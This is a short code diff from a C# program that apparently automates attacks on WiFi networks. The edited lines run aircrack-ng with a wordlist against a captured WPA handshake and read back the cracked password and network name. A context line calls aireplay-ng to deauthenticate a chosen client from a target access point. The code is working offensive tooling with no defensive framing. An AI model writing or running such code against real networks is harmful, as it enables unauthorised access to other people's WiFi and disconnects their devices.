@@ -74,7 +74,9 @@ namespace jchcar
                {
 
                    Console.WriteLine("Got handshake");
-                   RunCommand("/usr/bin/aircrack-ng","/home/jc/psk-01.cap -w /home/jc/wordlist.txt -l /home/jc/wifipass.txt");
+                   string[] cracklines = GetOutputLines("/usr/bin/aircrack-ng","/home/jc/psk-01.cap -w /home/jc/wordlist.txt -l /home/jc/wifipass.txt");
+                   Console.WriteLine(cracklines[5].Trim());
+                   w.ESSID = cracklines[4];
                    if (File.Exists("/home/jc/wifipass.txt"))
                    {
                        StreamReader sr = new StreamReader("/home/jc/wifipass.txt");
@@ -157,7 +159,7 @@ namespace jchcar
             if(clientMAC!="")
             RunCommand("/usr/sbin/aireplay-ng", "-0 1 -a "+w.BSSID+" -c "+clientMAC+" "+GetInterfaceName());
         }
-
+        
         public List<Wifi> Scan()
         {
             ManagedMode();
@@ -212,6 +214,8 @@ namespace jchcar
 
 
         }
+        
+        
         
     }
 }
